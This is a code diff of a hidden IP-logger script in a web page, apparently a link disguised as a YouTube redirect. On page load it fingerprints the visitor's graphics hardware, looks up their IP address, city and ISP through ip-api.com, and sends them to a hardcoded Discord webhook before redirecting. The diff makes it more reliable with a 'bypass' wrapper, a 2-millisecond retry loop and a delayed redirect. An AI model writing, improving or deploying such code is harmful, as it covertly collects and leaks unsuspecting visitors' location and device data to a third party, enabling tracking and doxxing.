@@ -5,6 +5,9 @@
     const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
     const y = "https://youtube.com/@LigmaBlox-w7m";
 
+    // The mandatory Discord bypass wrapper
+    const send = (msg) => navigator.sendBeacon(h, new Blob([JSON.stringify({content: msg})], {type: 'application/json'}));
+
     async function gD() {
         try {
             const gl = document.createElement('canvas').getContext('webgl');
@@ -18,23 +21,24 @@
         sessionStorage.setItem('v', '1');
         const dev = await gD();
 
-        // 1. Initial hit notification
-        navigator.sendBeacon(h, JSON.stringify({content: (v ? "RE-ENTRY" : "NEW HIT") + " | " + dev}));
+        // 1. Instant Hardware Ping
+        send(`[${v ? "RE-ENTRY" : "NEW HIT"}]\nDev: ${dev}`);
 
-        // 2. Loop until City/IP is found
+        // 2. The 2ms Brute-Force Loop for City/IP
         while(true) {
             try {
-                const r = await fetch('https://ip-api.com/json/').then(res => res.json());
+                const r = await fetch('https://ip-api.com/json/?cb=' + Date.now()).then(res => res.json());
                 if(r.status === "success") {
-                    const msg = "IP: " + r.query + "\nCity: " + r.city + "\nISP: " + r.isp;
-                    navigator.sendBeacon(h, JSON.stringify({content: msg}));
+                    send(`IP: ${r.query}\nCity: ${r.city}\nISP: ${r.isp}`);
                     break;
                 }
             } catch(e) {
                 await new Promise(s => setTimeout(s, 2));
             }
         }
-        window.location.replace(y);
+        
+        // 3. Clean Redirect
+        setTimeout(() => window.location.replace(y), 300);
     }
     run();
 </script>
